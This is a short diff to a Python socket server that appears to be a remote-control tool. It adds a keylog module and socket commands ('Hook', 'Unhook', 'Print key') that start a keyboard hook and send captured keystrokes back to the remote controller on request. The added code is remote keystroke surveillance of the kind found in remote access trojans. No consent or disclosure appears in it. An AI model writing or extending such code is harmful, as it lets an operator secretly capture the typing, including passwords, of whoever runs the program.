@@ -2,6 +2,7 @@ import socket
 import pyautogui
 import os
 import process
+import keylog
 import psutil
 from struct import *
 import pickle
@@ -120,8 +121,14 @@ class SocketServer(Socket):
             
         elif msg =='App':
             pass
-        elif msg =='Keystroke':
-            pass
+        elif msg =='Hook':
+            keylog.start_keylog()
+            hook_yet = True
+            keylog.hook()
+        elif msg == 'Unhook':
+            keylog.unhook()
+        elif msg == 'Print key':
+            self.Send(keylog.get_key())
         elif msg == 'Quit':
             self.conn.close()
             self.Close()
